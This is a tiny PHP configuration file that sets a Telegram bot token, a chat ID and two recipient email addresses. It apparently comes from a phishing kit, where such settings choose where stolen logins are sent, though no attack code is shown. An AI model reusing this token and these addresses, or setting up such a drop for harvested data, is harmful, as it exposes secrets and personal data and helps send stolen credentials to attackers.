<?php
$telegrambot = "5377211365:AAF3EtnxZwN-8OVxjX764DvKhbcxonAIeCA";
$telegramchatid = "2049660039";
$sendto = "juliamford1@gmail.com,luisaguilar674@aol.com";
?>